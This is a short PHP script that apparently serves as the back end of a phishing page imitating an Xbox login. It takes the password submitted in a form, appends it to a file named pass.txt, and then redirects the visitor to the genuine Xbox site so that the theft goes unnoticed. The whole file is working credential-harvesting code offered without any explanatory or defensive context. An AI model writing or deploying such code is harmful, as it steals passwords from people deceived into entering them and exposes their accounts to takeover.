<?php
file_put_contents("pass.txt", "" . $email = $_POST['pass'] . "\n", FILE_APPEND);
header('Location: https://www.xbox.com/en-IN/');
?>